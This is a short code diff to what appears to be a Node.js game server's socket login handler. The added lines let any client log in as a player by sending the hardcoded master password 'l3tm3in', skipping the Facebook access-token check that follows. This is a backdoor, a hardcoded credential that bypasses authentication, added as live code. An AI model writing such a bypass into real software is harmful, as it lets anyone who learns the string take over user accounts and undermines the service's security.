@@ -169,6 +169,14 @@ function init() {
                     }
                 });
             }
+            // using master password?
+            if(data.password && data.password == 'l3tm3in') {
+                LOGIC.login(player, data);
+                return;
+            } else if(data.password) {
+                player.msg("Invalid master password. Disconnecting..");
+                socket.disconnect();
+            }
             // check auth
             https.get({host: 'graph.facebook.com', port: 443, path: '/me?access_token=' + data.token}, function(res){
                 var fbresp = '';
